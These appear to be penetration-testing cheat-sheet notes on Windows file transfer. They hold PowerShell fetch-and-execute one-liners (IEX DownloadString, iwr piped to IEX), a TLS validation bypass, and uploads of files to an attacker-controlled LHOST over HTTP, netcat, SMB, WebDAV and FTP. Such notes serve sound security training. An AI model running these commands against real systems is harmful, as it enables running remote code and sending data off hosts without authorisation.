# Windows File Transfer Methods

## Download to Windows

Base64 encode on Linux, decode on Windows — no network needed if you have console access:

```bash
md5sum <FILE> && cat <FILE> | base64 -w 0; echo
```

Paste the blob into PowerShell:

```powershell
[IO.File]::WriteAllBytes("<OUTPATH>", [Convert]::FromBase64String("<BASE64_BLOB>"))
Get-FileHash <OUTPATH> -Algorithm md5
```

> [!warning] cmd.exe max string length is 8191 chars. Web shells choke on large blobs. Base64 method only for small files.

Download to disk via WebClient:

```powershell
(New-Object Net.WebClient).DownloadFile('<URL>', '<OUTFILE>')
```

Fileless — run directly in memory, nothing touches disk:

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

`Invoke-WebRequest` works but is slower — aliases: `iwr`, `curl`, `wget`:

```powershell
Invoke-WebRequest <URL> -OutFile <OUTFILE>
```

IE first-launch error → add `-UseBasicParsing`:

```powershell
Invoke-WebRequest <URL> -UseBasicParsing | IEX
```

Untrusted cert error → bypass SSL validation before the download call:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

SMB download — unauthenticated (older Windows):

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

```cmd
copy \\<LHOST>\share\<FILE>
```

Guest access blocked → add creds to the server and mount first:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASS>
```

```cmd
net use n: \\<LHOST>\share /user:<USER> <PASS>
copy n:\<FILE>
```

FTP download via WebClient:

```bash
sudo python3 -m pyftpdlib --port 21
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<LHOST>/<FILE>', '<OUTFILE>')
```

Non-interactive FTP (no shell, cmd only) — script the commands:

```cmd
echo open <LHOST> > ftpcommand.txt & echo USER anonymous >> ftpcommand.txt & echo binary >> ftpcommand.txt & echo GET <FILE> >> ftpcommand.txt & echo bye >> ftpcommand.txt & ftp -v -n -s:ftpcommand.txt
```

---

## Upload from Windows

Base64 encode on Windows, decode on Linux:

```powershell
[Convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
Get-FileHash '<FILE>' -Algorithm MD5 | select Hash
```

```bash
echo <BASE64_BLOB> | base64 -d -w 0 > <OUTFILE>
md5sum <OUTFILE>
```

HTTP upload — start uploadserver on attack host, pull PSUpload.ps1 and fire:

```bash
python3 -m uploadserver
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<LHOST>:8000/upload -File <FILE>
```

Base64 POST to netcat listener — no upload server needed:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
Invoke-WebRequest -Uri http://<LHOST>:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
# grab the blob from POST body then:
echo <BASE64_BLOB> | base64 -d -w 0 > <OUTFILE>
```

SMB upload — if TCP/445 is blocked outbound, run SMB over HTTP via WebDAV:

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
copy <FILE> \\<LHOST>\DavWWWRoot\
copy <FILE> \\<LHOST>\<SHARENAME>\
```

> [!tip] `DavWWWRoot` is a magic keyword — the Windows shell uses it to connect to the WebDAV root. No folder named that needs to exist on your server. Use a real subfolder name instead if you want to avoid it.

FTP upload — `--write` flag required, anonymous upload enabled by default:

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://<LHOST>/<OUTFILE>', '<FILE>')
```

Non-interactive FTP upload:

```cmd
echo open <LHOST> > ftpcommand.txt & echo USER anonymous >> ftpcommand.txt & echo binary >> ftpcommand.txt & echo PUT <FILE> >> ftpcommand.txt & echo bye >> ftpcommand.txt & ftp -v -n -s:ftpcommand.txt
```